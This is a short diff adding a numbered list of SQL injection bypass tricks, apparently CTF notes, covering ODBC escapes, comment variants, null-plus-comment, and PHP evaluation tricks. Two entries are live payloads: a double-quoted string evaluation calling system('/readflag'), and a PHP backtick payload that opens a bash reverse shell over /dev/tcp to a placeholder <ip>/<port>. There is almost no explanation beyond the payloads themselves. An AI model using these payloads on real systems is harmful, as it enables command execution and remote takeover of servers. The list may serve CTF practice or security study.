@@ -1,0 +1,12 @@
+1. ODBC Escape Sequences
+
+Comment
+2. Comment (-- & /**/)
+3. Comment (-- & /*!*/)
+4. null + Comment
+
+Double-quoted String Evaluation
+5. column=id="${system('/readflag')}"
+
+PHP Execution Operator
+6. column=name or @`bash -c "bash -i >& /dev/tcp/<ip>/<port> 0>&1"`
